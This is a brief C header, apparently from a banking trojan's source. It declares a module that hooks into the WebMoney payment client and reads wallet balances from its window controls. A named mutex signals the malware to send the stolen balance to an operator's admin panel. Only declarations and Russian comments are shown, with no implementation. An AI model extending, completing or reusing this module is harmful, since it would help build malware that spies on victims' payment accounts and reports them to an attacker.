#ifndef ___WEB_MONEY_DLLL____
#define ___WEB_MONEY_DLLL____

// Мюtекс который надо создать чтоб произошла отправка баланса в админку.
//	
#define WEBMONEY_EVENT		"jsjf"

// Модуль для полуения баланса кошельков вебмани
//


bool IsWebMoney();
//
// внутри процесса веб маней перебираем контролы главного окна, отсюда имеем баланс
void HookWebMoney();
#endif